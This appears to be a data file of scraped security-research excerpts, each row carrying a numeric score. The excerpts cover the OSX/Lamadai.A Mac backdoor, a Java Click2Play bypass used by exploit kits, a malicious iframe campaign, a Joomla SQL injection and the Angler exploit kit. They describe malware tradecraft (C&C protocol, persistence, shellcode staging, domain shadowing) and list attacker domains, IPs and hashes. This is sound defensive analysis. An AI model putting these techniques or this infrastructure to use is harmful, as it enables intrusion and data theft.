"OSX/Lamadai.A: The Mac Payload
Earlier this month, researchers from AlienVault and Intego reported a new malware attack targeting Tibetan NGOs (Non-Governmental Organizations). The attack consisted of luring the victim into visiting a malicious website, which then would drop a malicious payload on the target’s computer using Java vulnerability CVE-2011-3544 and execute it. The webserver would serve a platform-specific JAR",0.015486082543224478
28 Mar 2012 - 07:18AM,0.011266905403767846
"Earlier this month, researchers from AlienVault and Intego reported a new malware attack targeting Tibetan NGOs (Non-Governmental Organizations). The attack consisted of luring the victim into visiting a malicious website, which then would drop a malicious payload on the target’s computer using Java vulnerability CVE-2011-3544 and execute it. The webserver would serve a platform-specific JAR",0.015990728908272578
"Earlier this month, researchers from AlienVault and Intego reported a new malware attack targeting Tibetan NGOs (Non-Governmental Organizations). The attack consisted of luring the victim into visiting a malicious website, which then would drop a malicious payload on the target’s computer using Java vulnerability CVE-2011-3544 and execute it. The webserver would serve a platform-specific JAR (Java Archive) dropper based on the browser’s UserAgent String to infect the user’s Windows or OS X system.",0.015232818961367078
"The OS X-specific dropper is also served to Linux clients. Since the dropped payload is designed for OS X only, Linux clients will not be infected.",0.012949020569722247
This analysis is focused on the OS X payload and the network protocol it used to communicate with its Command and Control (C&C) server.,0.013028324422140858
"OS X uses the Mach-O file format for its executable files. For OSX/Lamadai.A, the Mach-O executable was compiled for 64-bit only, which is unusual since Mach-O binaries normally contain both the 32-bit and 64-bit versions of the executable.",0.016516469323414995
"Upon execution, the threat copies itself to /Library/Audio/Plug-Ins/AudioServer and adds a launcher script named ~/Library/LaunchAgents /com.apple.DockActions.plist pointing to the copied file to ensure it is executed whenever the current user logs in.",0.011518656510235648
"Note that by default, on OS X 10.7.2, regular users do not have write permissions to /Library/Audio/Plug-Ins/AudioServer, meaning this threat is not persistent (i.e. it won’t survive a reboot). We are unsure if older versions of OS X have different filesystem permissions. Nonetheless, using another location under the user’s home directory would have worked better for the attacker.",0.012504355862579586
"Afterwards, the threat will try to contact its C&C server by resolving dns.assyra.com (100.42.217.73 at the time of analysis, the domain now points to 127.0.0.1) and establishing a TCP connection to port 8008. The server will respond with a TCP RST unless it has some instructions to communicate. The infected system then falls into a busy wait loop, trying to reconnect at random intervals ranging from 0 to 10 seconds.",0.010789870348510755
The server may issue one of the three following instructions to the infected system:,0.0058560734049744045
"Upload a file: the C&C sends the path to upload, the client responds with the file content;",0.009485910219448113
"Download a file: the C&C sends the file path and content, the client creates the file with permissions set to 777 (-rwxrwxrwx);",0.008016865479013369
"Start a remote shell: the C&C sends an arbitrary shell command, the client responds with the output.",0.012469041265751768
"All communications between the client and the C&C are encrypted with AES and XOR. The crypto seems to be performed with a slightly modified implementation of AES and SHA1 from the PolarSSL library. The AES keys are generated from the first forty (40) bytes coming from the C&C. While the keys are constant during the entire communication, two different hardcoded XOR keys are used, one for incoming traffic and one for outgoing traffic.
Furthermore, the malware will not act upon any instruction unless the first packet received from the C&C matches a hardcoded key 16 bytes long, as seen in the picture below. The client will also add that key to the first response it will send to the C&C.",0.01624484663113268
"Key used to authenticate with the C&C
Finally, a custom SHA1-based hash is appended to every information packet going to and from the C&C for authentication and integrity checking purposes:
hash = SHA1(key1 + sha1(key2 + encrypted_packet_content + packet_number)) where key1 and key2 are two 64-byte strings derived from the first XOR key
During our investigation, we observed a live dialog between the C&C and our test machine. The timing and nature of the instructions received from the C&C lead us to believe that they were being manually typed by a human. Here are a few interesting pieces:
Finding the path to the cookies directory",0.011922318501939144
Finding the path to a Keychains directory,0.007750191380945459
"Where is that Downloads directory again?
After some filesystem browsing, the C&C issued two File Upload instructions targeting one Keychain file and the Safari’s cookies store. The purpose here clearly is information stealing.
A lot of effort has been put into the network protocol, which is quite involved. The operators seemed to have a real interest in hiding the raw communication from a network dump so as to make reverse engineering more difficult. However, the use of symmetric cryptography makes it so that it is totally possible to reproduce the encryption and decryption routines and analyze the communication on-the-fly.
This attack is another reminder to stay current with OS patches as Apple patched this vulnerability in Java for Mac OS X 10.7 Update 1 and Java for Mac OS X 10.6 Update in November 2011.
ESET security software (including ESET Cybersecurity for Mac) since signature update 7001 detects this threat as OSX/Lamadai.A. Some AV vendors flagged the file as OSX/Olyx, a previous Mac malware. We did not find any relation between the two threats, the network protocol and obfuscation techniques being different.
MD5 of the files analyzed:
39084b60790ca3fdebe1cd93a4764819  file-mac.tmp (OSX payload)
MD5 of related files
7f7cbc62c56aec9cb351b6c1b1926265  file-win.tmp (Win32 payload)
dd7421fb6ca03c5752a06cffb996285a  index.jar (OSX/Linux dropper)
2d86dce83851f76493ba0492d066c095  default.jar (Win32 dropper)
4b6eb782f9d508bbe0e7cfbae1346a43  index.html (HTML serving the droppers)
Thanks to Marc-Étienne M. Léveillé who performed the technical analysis.",0.011723515769396342
"Alexis Dorais-Joncas
",0.009430687948950855
"Java Click2Play Bypass is no problem for Malwarebytes Anti-Exploit
Security company VUPEN revealed a vulnerability in Java’s Preloader in early July that’s quite likely the same one being integrated into cyber criminals’ exploit kits.
According to VUPEN’s report, the vulnerability is “caused by a design error in the Java click-2-play security warning when the preloader is used, which can be exploited by remote attackers to load a malicious applet (e.g. taking advantage of a Java memory corruption vulnerability) without any user interaction.”
The flaw which affects Java version 7 update 21 and earlier bypasses the traditional security warning displayed before an applet is allowed to run:",0.010693099586750687
"In essence, the exploit will be delivered silently and the user will never see the security prompt.
French security researcher @Kafeine blogged about this last week when he identified the vulnerability being used in at least three exploit kits: Cool EK, Sakura and Nuclear Pack.
The Click2Play bypass is coupled with CVE-2013-2460 which in itself is not able to directly infect the victim without a security prompt.
Having both Click2Play bypass and CVE-2013-2460 together guarantees the highest infection rates since anybody running Java 7 update 21 or earlier will get infected.
When it comes to drive-by attacks, Malwarebytes users can rely on a double layer of protection: our flagship Malwarebytes Anti-Malware and our new Malwarebytes Anti-Exploit.
The first layer of defense, Anti-Exploit, proactively blocks unknown threats coming from your browser or common applications, before they infect your system.
Anti-Exploit is not based on a list of CVEs or malware signatures and that is one of its strengths.
To prove that point we went ahead and tested this attack with a year-old version of the software, when it was still called ExploitShield.
As you can see in the video below, the threat was stopped in its tracks.",0.01315335236712123
"A few months ago, ExploitShield became part of the Malwarebytes family and re-branded as Malwarebytes Anti-Exploit.
The following video shows how easy it is to install it and be protected immediately:",0.015534536795870912
"If you weren’t running Anti-Exploit and got infected, you most likely got hit with Ransomware or Fake AV.
Urausy Ransomware for US residents:",0.011535390782357768
Fake AV (Antivirus Security Pro):,0.009332176676464576
"Screenshot courtesy of Malware don’t need coffee
On an already infected system we recommend Malwarebytes Anti-Malware. If you can’t get it to install, there is a utility called Chameleon designed specifically for those tricky situations where malware is preventing you from running removal tools.
It goes without saying that stopping an infection as early as possible is the best way to go. With a layered defense, you are keeping your system more secure against web threats.
While Anti-Exploit will protect up-to-date as well as outdated systems equally (it will block zero days and existing vulnerabilities), it still makes sense to apply some basic security principles such as opting in for Windows automatic updates, applying third-party software patches, etc.
With regards to Java, because it is such a big target in all exploit kits, we recommend that you disable the browser plugin, or if you feel you don’t need it at all, to uninstall it altogether.
Reducing the attackers’ surface of attack on your system is one of the simplest and most effective things to do.",0.012022681739113472
"Jerome Segura (@jeromesegura) is Senior Security Researcher at Malwarebytes.
",0.011248272023240635
"Sharing is caring. In this post, I’ll put the spotlight on a currently circulating, massive — thousands of sites affected — malicious iframe campaign, that attempts to drop malicious software on the hosts of unaware Web site visitors through a cocktail of client-side exploits. The campaign, featuring a variety of evasive tactics making it harder to analyze, continues to efficiently pop up on thousands of legitimate Web sites. Ultimately hijacking the legitimate traffic hitting them and  successfully undermining the confidentiality and integrity of the affected users’ hosts.",0.011542865764295751
"Sample redirection chains:
hxxp://www.cibonline.org/cache/mod_poll/7c7478fde2f89a23.php -> hxxp://www.haphuongfoundation.net/vietnam/language/pdf_fonts/www/all2.php -> hxxp://www.profili-benton.si/templates/beez/1.php -> hxxp://www3.omq97dncl0enuzc91.4pu.com -> hxxp://find-and-go.com/?uid=11245&isRedirected=1 -> hxxp://5.199.169.39/piwik/piwik.php?idsite=6
hxxp://www.cibonline.org/cache/mod_poll/7c7478fde2f89a23.php -> hxxp://www.haphuongfoundation.net/vietnam/language/pdf_fonts/www/all2.php -> hxxp://www.profili-benton.si/templates/beez/1.php -> hxxp://www3.omq97dncl0enuzc91.4pu.com (95.141.42.88) -> hxxp://www1.vjq1b9261b4d0.4pu.com/i.html (66.199.250.147) -> hxxp://www1.vjq1b9261b4d0.4pu.com/nnnnvdd.html -> hxxp://www1.vjq1b9261b4d0.4pu.com/pdfx.html -> hxxp://www1.vjq1b9261b4d0.4pu.com/qopne.html -> hxxp://www1.vjq1b9261b4d0.4pu.com/fnts.html
hxxp://www.cibonline.org/cache/mod_poll/7c7478fde2f89a23.php -> hxxp://www.haphuongfoundation.net/vietnam/language/pdf_fonts/www/all2.php -> hxxp://www.profili-benton.si/templates/beez/1.php -> hxxp://www3.omq97dncl0enuzc91.4pu.com (109.201.135.20) -> hxxp://www1.u7dtn91y8y09.4pu.com/i.html -> hxxp://www1.u7dtn91y8y09.4pu.com/iexp.html -> hxxp://www1.u7dtn91y8y09.4pu.com/jmnyhsr.html
hxxp://www.cibonline.org/cache/mod_poll/7c7478fde2f89a23.php -> hxxp://www.haphuongfoundation.net/vietnam/language/pdf_fonts/www/all2.php -> hxxp://profili-benton.si/templates/beez/1.php -> hxxp://www3.e96s0ttcl.4pu.com (109.201.135.20) -> hxxp://www1.thh3ssp6.4pu.com/i.html -> hxxp://www1.thh3ssp6.4pu.com/nnnnvdd.html -> hxxp://www1.thh3ssp6.4pu.com/pdfx.html -> hxxp://www1.thh3ssp6.4pu.com/qopne.html -> hxxp://www1.thh3ssp6.4pu.com/0a8aqgdg7qedig.swf
Sample detection rate for the served client-side exploits:
MD5: 3b141482d57aa716c8686b388fcbc8f3 – detected by 5 out of 47 antivirus scanners as Exploit:Win32/Pdfjsc.AKB
MD5: 4d52aa24c91b2f9b757ab81118f56447 – detected by 5 out of 47 antivirus scanners as Exploit.Win32.CVE-2011-3402.a
MD5: cee8493b53394a2b58228b829f2af25e – detected by 5 out of 47 antivirus scanners as Exploit:Win32/Pdfjsc.AKB
MD5: 1b61c150176f0ab076f8befb46cfc3ce – detected by 4 out of 47 antivirus scanners as Exploit:SWF/Salama.F
Responding to (66.199.250.147) are also the following malicious domain, part of the campaing’s infrastructure:
hxxp://www1.2fmjnfw8yl.4pu.com
hxxp://www1.b245489okr8x5j2ao.4pu.com
hxxp://www1.c5laimisz83pc4.4pu.com
hxxp://www1.cg86g6670v8866.4pu.com
hxxp://www1.d23v9rkj.4pu.com
hxxp://www1.e0ypzxcl2g.4pu.com
hxxp://www1.e0zz7py279t37.4pu.com
hxxp://www1.e3upj5djor1ff8.4pu.com
hxxp://www1.eoyuwo33xk08zk6a6.4pu.com
hxxp://www1.g3qovry5o502d1g8.4pu.com
hxxp://www1.h3x48xalmvan55.4pu.com
hxxp://www1.j-9x9quv8lrdqicyf4.4pu.com
hxxp://www1.j9jw1i0or74893.4pu.com
hxxp://www1.js9fow2qc23vir9m-2.4pu.com
hxxp://www1.k3s7v5h96w4m9rm17.4pu.com
hxxp://www1.k5t56to8.4pu.com
hxxp://www1.kjrca9kozgygi2.4pu.com
hxxp://www1.lr615xyv4ne4ev2s2.4pu.com
hxxp://www1.m-t439plolgh9rg3x8.4pu.com
hxxp://www1.mwqfes56.4pu.com
Responding to (109.201.135.20) are also the following malicious domain, part of the campaing’s infrastructure:
10qaswedrfgthsfh47.4pu.com
2fmjnfw8yl.4pu.com
4gpf37.4pu.com
24r23rfe23.4pu.com
54y5h56yh.4pu.com
6qaswedrfgthsfh46.4pu.com
789568gh48fjh34.4pu.com
8m5w180sfs.4pu.com
98ol8loldd.4pu.com
a-1lj8fexbrqilv.lflink.com
a199ozb9gpvairco9.4pu.com
a6fe5t76kp7xzc5t.lflink.com
a8eb8spt8sp02.lflink.com
aaagxmid11pp-7.4pu.com
ae8w0olox4.4pu.com
ao83szty36u9x-9.lflink.com
auh40nk2.4pu.com
b-8720elxb.4pu.com
b-8qkw4qs.lflink.com
b-9s7rtwq9j.4pu.com
Webroot SecureAnywhere users are proactively protected from these threats.
",0.01889784720622434
"Joomla 3.4.5 Released, Fixing a Serious SQL Injection Vulnerability",0.007567008514670848
"The Joomla team just released a new Joomla version (3.4.5) to fix some serious security vulnerabilities. The most critical one is a remote and unauthenticated SQL injection on the com_contenthistory module (included by default) that allows for a full take over of the vulnerable site.
Update October 26, 2015: We posted a follow up looking at the prevalence of Joomla SQL injection attacks in the wild less than 24 hours after this disclosure.
Directly from the Joomla announcement:",0.011203205697196239
"Joomla! 3.4.5 is now available. This is a security release for the 3.x series of Joomla which addresses a critical security vulnerability. We strongly recommend that you update your sites immediately. This release only contains the security fixes; no other changes have been made compared to the Joomla 3.4.4 release.
If you are a Joomla user, you have to patch your site now! If your site is behind our Website Firewall (CloudProxy) you were already protected even before the disclosure via the Virtual Hardening / Patching engine, which focuses on generic SQLi attack vectors.
Technical Details
This vulnerability was discovered by the TrustWave team and they published a very good document explaining it in detail. We highly recommend reading it to understand the scope and how it can be exploited:  Joomla SQL Injection Vulnerability Exploit Results in Full Administrative Access.
Joomla had a 6.6 percent share of the market for website CMSs as of October 20, 2015 according to W3Techs—second only to WordPress. Internet services company BuiltWith estimates that as many as 2.8 million websites worldwide use Joomla.
CVE-2015-7297, CVE-2015-7857, and CVE-2015-7858 cover the SQL injection vulnerability and various mutations related to it.
CVE-2015-7857 enables an unauthorized remote user to gain administrator privileges by hijacking the administrator session. Following exploitation of the vulnerability, the attacker may gain full control of the web site and execute additional attacks.",0.009051209172740271
"The vulnerability can be exploited in Joomla versions 3.2 (released in November 2013) through version 3.4.4.
Because the vulnerability is found in a core module that doesn’t require any extensions, all websites that use Joomla versions 3.2 and above are vulnerable.
Asaf also uncovered the related vulnerabilities CVE-2015-7858 and CVE-2015-7297 as part of his research.",0.006433210249586541
"Due to the easy exploitation of this vulnerability and popularity of Joomla, we expect to see attacks in the wild very very soon with a massive number of sites hacked.
We recommend looking at your web logs to try to find signs of this attack. If you search for “option=com_contenthistory&view=history” you should be able to find possible attacks against your site. Note that blocking these requests only via GET requests are not enough, since they can also happen via POST. Joomla uses the PHP $_REQUEST, so both POST and GET will go through.
If you are using Joomla, patch it now!
",0.011847494476016962
Sophos products are not at risk from the latest OpenSSL bug,0.008323750478378744
"Written by
Editor",0.007990427730288352
"July 10, 2015",0.008442777147044778
Cloud Network Partners Products & Services OpenSSL Vulnerabilities,0.00713780073238357
"You may have seen the OpenSSL team announced, on Monday 2015-07-06, that it had a “high severity” update coming out in three days’ time. The update was published Thursday 2015-07-09.
The good news is no Sophos products are at risk from this bug. Only the current pre-release Beta version of Sophos Management Communication System (MCS 3.0.0 Beta), a component used by Sophos Cloud and UTM Endpoint products, includes an affected version of OpenSSL. However, MCS does not use the relevant part of the OpenSSL code for certificate verification, so cannot fall foul of the bug. Nevertheless, we expect to update MCS 3 Beta with the latest OpenSSL version by mid-August 2015.
All other Sophos product families either don’t use OpenSSL at all, or use one of the unaffected versions.",0.011221144826699225
"For more information see the links below. If you have any questions please contact your account manager in the first instance.
Learn more about OpenSSL CVE-2015-1793 (Naked Security)
See the latest Sophos support information (KBA)",0.012096215581059555
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
A closer look at the Angler exploit kit,0.008966231221990695
SophosLabs Uncut•Threat Research•Angler•Drive-by downloads•Exploit kits,0.009274889752264981
An in-depth look at one of the more notorious exploit kits used to facilitate drive-by downloads,0.008044949632973752
"Written by
Fraser Howard",0.009895127539591209
"July 21, 2015",0.008510348357897768
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
17,0.014677742533125038
"Over the past few years exploit kits have been widely adopted by criminals looking to infect users with malware. They are used in a process known as a drive-by download, which invisibly directs a user’s browser to a malicious website that hosts an exploit kit.
The exploit kit then proceeds to exploit security holes, known as vulnerabilities, in order to infect the user with malware. The entire process can occur completely invisibly, requiring no user action.
In this research article we will take a closer look at one of the more notorious exploit kits used to facilitate drive-by downloads – a kit known as Angler exploit kit (Angler hereafter).
1 Introduction
Angler first appeared in late 2013, and since then has significantly grown in popularity in the cyberunderworld. Its aggressive tactics for evading detection by security products have resulted in numerous variations of the various components it uses (HTML, JavaScript, Flash, Silverlight, Java and more). Angler is also extremely prevalent. For example, in May 2015, we uncovered thousands of new web pages booby-trapped with Angler – so-called landing pages – every day.
The weekly volume of Angler related detections since mid-2014 shows a burst of activity in late 2014, followed by a slight lull, and then increased activity from March 2015 onwards:
Figure 1: Growth of Angler exploit kit measured by weekly detection volume.
Since the demise of the Blackhole exploit kit in October 2013, when its alleged operators were arrested, other exploit kits have certainly flourished and shared the marketplace, but Angler has begun to dominate. To show Angler’s prevalence against other exploit kits, we analyzed a snapshot of activity for three different periods (September 2014, January 2015 and May 2015):
Figure 2: Distribution of exploit kit activity as measured by detection telemetry based on a week’s worth of data in September 2014, January 2015 and May 2015.
2 Traffic Control
Clearly, the success of any exploit kit lies in its ability to exploit its target computers and successfully install malware. But exploits kits also need a good volume of incoming traffic in order to have a steady stream of potential victims to infect. For most drive-by downloads, this is achieved by hacking into legitimate websites and injecting malicious HTML or JavaScript into their content. The higher the profile and popularity of the victim web site, the greater the volume of traffic that will be fed to the exploit kit.
We have seen a variety of tricks used to send user web traffic to Angler. Many of them involve simple IFRAME (inline HTML frame) injection using added HTML or JavaScript, and are not particularly interesting. However, some of the redirection methods used with Angler are a bit more unusual and warrant a mention here.
2.1 HTTP POST redirection
Above, I indicated that typical redirections are invisible to the user. Actually this is not always the case, as illustrated with the first example, taken from May 2014. We saw a huge number of legitimate sites injected with a combination of JavaScript and HTML, as shown below. In contrast to typical injections, this one involved the addition of FORM and DIV elements in addition to some JavaScript:
Figure 3: Injected JavaScript and HTML (detected as Troj/JSRedir-OA)
Upon loading the page, the user is presented with a dialog box, prompting them to click either “Yes” or “Cancel”. As evident from the injected Javascript, whichever is clicked, the Go() function is run, which removes the popup, adds an IFRAME placeholder, and then submits the form:
Figure 4: Popup displayed when user browses site injected with Troj/JSRedir-OA.
The data sent in the form submission includes three values (encoded), presumably to assist the criminals managing this redirection mechanism:",0.023355544846726528
"IP address
User-Agent string
URL",0.008796909144063725
"The response to the form POST is further HTML and Javascript (loaded into the IFRAME placeholder), which redirects the user: .
Figure 5: Response from the HTTP POST containing JavaScript to initiate the redirect.
A few months later we saw a similar technique being used, but this time with a Flash component. The compromised web pages were modified to include HTML that loaded a malicious Flash file from yet another compromised site.
ActionScript within the Flash file would then retrieve the various parameters and issue the HTTP POST request.
Figure 6: ActionScript used in Flash version of Troj/JSRedir-OA.
The response to the HTTP POST was like before (Figure 5), with HTML and JavaScript sent back to redirect the user. Interestingly, in early 2015 we saw this latter redirection technique also being used to send traffic to the Nuclear exploit kit.
2.2 Domain generation algorithm
Another trick we have seen used in Angler redirects is the use of domain generation algorithms (DGAs). In 2014, many legitimate web pages were injected with JavaScript that added a script element to load content from a remote site with a hostname that was computer based on a hash of the current date. The idea is that the domain name changes every day, but the malicious script does not need to contain a long list of future names. These DGA redirects were seen using both .EU and .PW domain names.
Figure 7: Snippet of code from injected JavaScript redirect using DGA (Troj/JSRedir-OE).
The downside of this type of redirect is that once the algorithm is known, the security community can predict the target hostname on any particular date, and can blocklist it, effectively shutting down the attack.
2.3 HTTP redirects
The final example included in this section illustrates the use of web redirects using the HTTP response code 302, commonly used on legitimate sites to divert visitors elsewhere. This involves straightforward content injection, but with an additional link in the redirect chain. In late April 2015, we noticed that users browsing the eHow web site were being redirected to Angler. Analysis of the traffic revealed the redirection steps illustrated in Figure 8.
JavaScript had been inserted into one of the legitimate libraries on ehowcdn.com to load content from what looked to be an Optimizely server. (Optimizely provides website analytics services, frequently used to assess web advertising effectiveness.) However, note the additional “s” at the end of the hostname to give optimizelys.com instead of the legitimate optimizely.com.
Figure 8: Overview of recent redirection masquerading as Optimizely hack.1: web page on eHow site, 2: script on ehowcdn.com which loads script from optimizelys.com, 3: script adds malicious iframe, 4: 302 bounce to the Angler landing page.
Within days of observing this, we received other reports of identical redirection (cdn3.optimizelys.com again) being used from other sites – this time the final target being the Nuclear exploit kit.
3 Exploit Kit
3.1 Landing page
The landing page is the starting point for the exploit kit code. Typically it uses a mixture of HTML and JavaScript content to identify the visitor’s browser and the plugins installed, so that the exploit kit can choose the attack most likely to result in a drive-by download.
A variety of obfuscation techniques have been used in the Angler landing pages since the first appearance of the kit. Aside from making analysis more awkward, these techniques make it easier for the criminals to dynamically build unique content on each request, in an attempt to evade detection by security products. For the past year or so, Angler has been encoding its main script functionality as data strings stored in the parent HTML. This content is then retrieved and decoded when the landing page is loaded by the browser. This is a common and well established anti-emulation technique used by numerous malicious threats.
Decoding the outermost obfuscation layer reveals the next trick used by Angler – anti-sandbox checks. It uses the XMLDOM functionality in Internet Explorer to determine information about files present on the local system. It does this in order to detect the presence of various security tools and virtualization products:
Figure 9: Snippet of code from Angler landing page showing code to check for the presence of various security tools and virtualization products.
Beneath the anti-sandbox checks is a second obfuscation layer. A function is called to convert several long strings into Unicode (double-byte) data, some of which is actually script content later added to the page. In most cases, this will be more JavaScript, but sometimes (specifically when CVE-2013-2551 is targeted) there will be VBScript content as well:
Figure 10: Second obfuscation layer, hiding shellcode data and additional script content that is added to the page (in this case CVE-2013-2551 is targeted, so both JS and VBS content is added).
The added script content will be specific to the particular vulnerabilities targeted in any version of the landing page. In all cases however, the added scripts will contain code to:",0.02482562126568877
"Dynamically construct shellcode.
Retrieve data from an array in the Angler landing page (see below).",0.0164083005098683
"Angler landing pages contain an array of encoded strings, each of which is decoded by a simple substitution cipher provided by a JavaScript function in the decoded page. (Occasionally the encoded strings are stored in a sequence of variables, but an array is more common.) The key used in the cipher is typically the first member of that array (uhBNwdr[0] below):
Figure 11: Substitution cipher used in Angler landing page.
The size and content of this array will vary according to the vulnerabilities targeted in that version of the kit. Examples of the data stored in the array include:",0.010520720420587826
"The name of the server hosting the exploit kit.
Folder used to locate Silverlight content
Folder used to locate Flash content
Payload URLs.
Flash payload string (encoded shellcode or URL data).",0.011750389292183305
"This data is retrieved and decoded as necessary. Here, you can see the relevant payload string being incorporated into the dynamically generated shellcode:
Figure 12: JavaScript function to build unicode string later decoded by shellcode upon exploitation of CVE-2014-6332. The function includes the payload URL and payload decryption key.
The code to load the malicious Flash component is straightforward. Assuming the anti-sandbox checks are passed, three characteristically named (get*) functions are used to retrieve and decode strings from the landing page. These are then used to build the HTML object element, which is added to the document:
Figure 13: Angler landing page code that is used to load malicious Flash content.
3.2 Flash content
Angler’s Flash content has varied considerably over the past year. The samples are routinely obfuscated using various techniques, including:",0.015382209617356257
"ActionScript string obfuscation techniques.
Base64 encoding.
RC4 encryption.
Commercial Flash obfuscation/protection tools (e.g. DoSWF and secureSWF).",0.017021992149973464
"An additional complication is Angler using embedded Flash objects. The initial Flash loaded from the landing page is fairly innocuous, serving merely as a loader to deliver the exploit via an inner Flash. The inner Flash may be carried as a binaryData object or encoded as a string within the ActionScript. In either case, the data will be encrypted using RC4. An example from January 2015 looks like this:
Figure 14: Outermost Flash carries inner Flash encrypted with RC4 and Base64 encoded.
Data is passed from the landing page to Flash via the use of a FlashVars parameter in the landing page HTML – a common technique in recent exploit kits.
This is easily accessible from ActionScript via the parameters property of the loaderInfo object. This mechanism has been well used in many exploit kits in order to:",0.014226754268408803
"Pass in payload URL data.
Pass in shellcode.",0.012740000729423273
"This flexibility enables dynamic customization of shellcode without having to recompile the Flash itself.
Figure 15 shows snippets of the ActionScript used in recent Angler Flash objects to retrieve the encoded data from the landing page (“exec” variable). Additionally, you can see the use of control flow obfuscation in some of the functions involved, complicating analysis:
Figure 15: Retrieving encoded data from the landing page (“exec” variable) which is then decoded by an ActionScript function.
In early 2015, there was a succession of zero-day vulnerabilities (including CVE-2015-0310, CVE-2015-0311, CVE-2015-0313, CVE-2015-0315, CVE-2015-0336, CVE-2015-0359) in Adobe Flash Player, which were quickly targeted by Angler. The targeting of these vulnerabilities by Angler (and other exploit kits) has been well described elsewhere.
This flurry of Flash activity supports the trend away from Java exploitation over the past 18 months, a change that was kickstarted when Oracle blocked the use of unsigned browser applets by default in Java 7 update 51.
3.3 Shellcode analysis
As noted above, the shellcode is dynamically generated within the script when the landing page is loaded by the browser. The exact contents of the shellcode will vary according to the vulnerability being targeted, but in all cases the encoding and structure is similar. The analysis below describes the shellcode that is used in exploiting CVE-2014-6332.
On first sight it was evident that the shellcode data (shellcode_part1, shellcode_part2 and shellcode_part3 in Figures 10 and 12) did not seem to contain valid code. Closer inspection revealed why – additional code is added to the start of the shellcode from the VBScript component. The JavaScript build_shellcode() function in Figure 12 is actually called from the VBScript (Figure 16).
Figure 16: Snippet of the VBScript code used to construct the shellcodeused in CVE-2014-6332 exploitation.
Sure enough, analysis of the additional Unicode data provided from the VBScript (buildshell1 in Figure 16) confirms it is executable code, and actually contains a small decryption loop to decrypt the bytes contained in remainder of the shellcode, which includes the payload URL and decryption key. This decryption loop reverses the encData() function referenced in Figure 12, where the payload URL and payload key were encrypted.
Figure 17: Snippet of shellcode illustrating the decryption loop provided by the VBScript.
Inspection of another landing page sample, this time one targeting CVE-2013-2551, shows the same technique, but this time, the decryption loop is added within the JavaScript:
Figure 18: Snippet of JavaScript showing the same shellcode decryption loop as in Figure 17.
After this loop completes, the main shellcode body is decoded and can be analyzed.
After resolving the base address for kernel32, the shellcode parses the export address table to find the functions it requires (identified by hash). It then uses LoadLibraryA API to load winhttp.dll, and parses those exports to find the functions it needs:",0.01919914531503919
"Module
Functions (imported by hash reference)",0.013947179602389448
"kernel32.dll
CreateThread, WaitForSingleObject, LoadLibraryA, VirtualAlloc, CreateProcessInternalW, GetTempPathW, GetTempFileNameW, WriteFile, CreateFile, CloseHandle",0.01883586809380655
"winhttp.dll
WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, WinHttpReceiveResponse, WinHttpQueryDataAvailable, WinHttpReadData, WinHttpCrackUrl, WinHttpQueryHeaders, WinHttpGetIeProxyConfigForCurrentUser, WinHttpGetProxyForUrl, winHttpSetOption, WinHttpCloseHandle",0.022475739787028548
"If the exploit works, then the payload is downloaded and decrypted by the shellcode, using the aforementioned key. Angler uses different keys according to the exploitation path (Internet Explorer, Flash, Silverlight – at least two keys for each are currently known).
After decrypting the payload, the shellcode checks the header to identify if the payload is yet more shellcode (which starts with do-nothing NOP instructions at the start) or a Windows program (which starts with the identifying text string “MZ” at the start):
Figure 19: Logic in shellcode to check payload type.
If the decrypted payload is a program, it will be saved and run. If it is a second stage of shellcode, the final executable payload is embedded within the body of the shellcode (sometimes in both 32-bit and 64-bit versions).
When the second-stage shellcode runs, the payload is inserted directly into memory in the process of the exploited application, without first being written to disk. This “no-file” characteristic is responsible for some of the notoriety that Angler has recently gained. This mechanism has been used to infect users with malware from the Bedep family, which itself provides the ability for an attacker to download yet more malwares.
4 Network Perspective
In this section, we will switch focus from content analysis to a look at Angler activity from a network perspective.
4.1 Fresh registrations
As with most web attacks, Angler makes liberal use of fresh domain registrations.
As is typical for drive-by downloads, we usually see a flurry of registrations that resolve to the same IP number for a short period.
Occasionally, Angler has used free dynamic DNS services, a tactic widely used by exploit kits for years.
4.2 Domain shadowing
Angler has made aggressive use of hacked DNS records as well, a technique used by attackers for several years that is becoming popular once again. The criminals update the DNS records of legitimate domains, adding multiple sub-domains that direct to the malicious exploit kit – a technique sometimes called domain shadowing.
An example is shown in Figure 20, based on some activity seen in May 2015. In these attacks, a 2-level technique is used, where the DNS records have been updated to include wildcard entries (*.foo.example.com, *.bar.example.com). So in this attack, the records were updates with entries including:",0.01865465679245437
"*.bro.directorsinstitute.net
*.fer.directorsinstitute.org",0.012281159204272418
"This enables the attackers to resolve their shadowed domains to the malicious IP, a computer hosted in Russia at the time of writing. As you can see, the specific sub-sub-domains used in the Angler redirects appear to be six-character strings, presumably chosen to let the attackers track and attribute incoming traffic (most likely for statistics and payment).
Figure 20: Domain shadowing (two-level sub-domains) used by Angler (May 2015).
In other cases, we have seen Angler using single-level DNS hacks:
Figure 21: Domain shadowing (single-level sub-domains) used by Angler (May 2015).
In some cases the string used in the sub-domain appears to have some relevance to the domain name being shadowed. This suggests human involvement, rather than random text generated by a program.
Domain shadowing relies on the criminals being able to modify legitimate DNS records, which is most likely due to stolen credentials. Site owners do not necessarily understand the critical nature of their DNS records, so it is concerning that many of the providers/registrars do not guard the DNS configuration more closely.
Most site owners will rarely need to update the records, so any updates should ideally be protected by more than user credentials. Suggestions to improve this situation include:",0.015595433990830965
"Implement two-factor authentication.
Send email notifications after DNS changes.",0.015709438107999074
"Thanks to collaboration with researchers at Nominet, we have been able to look more closely into the domain shadowing activity used in Angler attacks. The intention was to reveal the timeline of events upon a DNS record being hacked. We focused on the DNS query activity for a number of domains associated with a single compromised user account where attackers were using two-level domain shadowing (as in Figure 20).
Figure 22 illustrates a snapshot of DNS query activity for 26 February 2015. Data for three domains (all within the same compromised user account) is included. Green circles show the overall query volume; purple squares highlight above-average query volumes; and the white circles denote periods of sharply-increased query volume, when the attackers started actively using these domains for Angler traffic.
Figure 22: Timeline of DNS query activity on Feb 26th 2015 for three domains.
This data reveals two stages in the attack. First, the criminals tested the hacked DNS records with a modest number of queries at 10am. These queries were for the single-level sub-domain, (foo.domain.co.uk), and were all from the same source.
Once the criminals are happy their newly-stolen domain names are resolving reliably, we see bursts of malicious Angler traffic using the two-level sub-domain. In figure 22 you can visualize the attackers cycling through the different domains, with each one being active only for a short period. This correlates nicely with our detection telemetry, where we see similar bursts of activity per hostname.
